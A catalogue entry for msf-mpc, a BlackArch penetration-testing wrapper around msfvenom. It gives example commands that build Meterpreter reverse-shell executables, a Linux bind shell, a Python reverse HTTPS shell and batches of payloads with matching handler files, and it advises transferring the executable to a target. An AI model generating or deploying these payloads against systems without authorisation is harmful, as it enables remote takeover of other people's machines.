---
name: "msf-mpc"
categories:
  - blackarch-automation
version: "35.8007ef2"
homepage: "https://github.com/g0tmi1k/mpc"
packaged-by: [blackarch]
blackarch-builddate: "2021-01-16"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "g0tmi1k/mpc"
github-stars: 1333
github-pushed: "2021-05-09"
github-archived: false
github-issues: 9
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# msf-mpc

> MSFvenom Payload Creator (MSFPC): one-argument wrapper that generates a payload plus its matching Metasploit handler resource file.

## What it's for

MSFPC wraps `msfvenom` so a single argument — the platform or file extension (`windows`, `elf`, `py`, `apk`, ...) — produces a ready-to-use payload and, alongside it, a `.rc` resource file that starts the correctly-configured msfconsole handler. Every other parameter is optional and order-insensitive: LHOST can be a literal IP, an interface name (`eth0` — resolved automatically), or `wan` (external IP discovered for you); missing LPORT defaults to 443, direction defaults to reverse, and staging defaults to staged where the platform allows. `batch` and `loop` modes mass-produce combinations. It does not attempt any antivirus evasion. On BlackArch the upstream `msfpc.sh` script is installed as `msf-mpc`.

## Typical use cases

### Generate a Windows Meterpreter payload with a handler

Produce an executable and the command to catch its callback.

```
msf-mpc windows 198.51.100.10
```

Outcome: builds `windows/meterpreter/reverse_tcp` staged reverse TCP (LHOST 198.51.100.10, LPORT 443) and writes both the payload (`windows-meterpreter-staged-reverse-tcp-443.exe`) and `windows-meterpreter-staged-reverse-tcp-443-exe.rc`; the output prints the exact msfvenom command used and tells you to catch the shell with `msfconsole -q -r '<file>.rc'`. Double-click or transfer the exe to the target and run the resource file locally to receive the session.

### Generate a Linux bind shell using an interface address

Let the tool resolve LHOST from a network interface.

```
msf-mpc elf bind eth0 4444
```

Outcome: MSFPC reads eth0's IP address, builds `linux/x86/shell/bind_tcp` as an ELF (`linux-shell-staged-bind-tcp-4444.elf`), prints its size and MD5/SHA1 hashes, and writes the matching `.rc` handler file. Bind means the target opens port 4444 and you connect to it.

### Generate a stageless Python payload over HTTPS

Smaller argument-driven combo: no staging, command shell, TLS transport.

```
msf-mpc stageless cmd py https
```

Outcome: with no IP given, an interactive IP menu appears listing every interface plus `wan`; after selection it writes `python-shell-stageless-reverse-https-443.py` (payload `python/shell_reverse_tcp` over HTTPS) and its `.rc` handler — a self-contained script that needs no Metasploit stage delivered at runtime.

### Mass-produce payloads

One of every type, or every Meterpreter combination, in one run.

```
msf-mpc loop wan
msf-mpc msf batch wan
```

Outcome: `loop` creates one payload per TYPE (apk, asp, aspx, bash, jsp, elf, macho, perl, php, ps1, py, war, windows) using the discovered WAN IP; `batch` walks the full cross-product of the filters you give it (here every Meterpreter variant). Each generated payload lands in the current directory with its own `.rc` file, with MD5/SHA1 printed per file.

*No corpus evidence — derived from upstream documentation.*
